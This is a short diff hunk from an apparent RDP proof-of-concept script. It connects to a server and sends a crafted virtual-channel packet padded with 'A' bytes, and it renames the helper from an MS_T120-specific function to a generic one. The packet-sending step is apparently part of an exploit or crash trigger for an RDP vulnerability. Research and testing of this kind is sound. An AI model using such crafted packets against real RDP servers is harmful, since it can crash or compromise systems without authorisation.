@@ -12,7 +12,7 @@ def main():
 
     crypter = rdp.connect(s)
 
-    s.sendall(rdp.write_mst120_custom(crypter, 7, 1007, b'A'*80))
+    s.sendall(rdp.write_virtual_channel(crypter, 7, 1007, b'A'*80))
 
     input('lul')
 
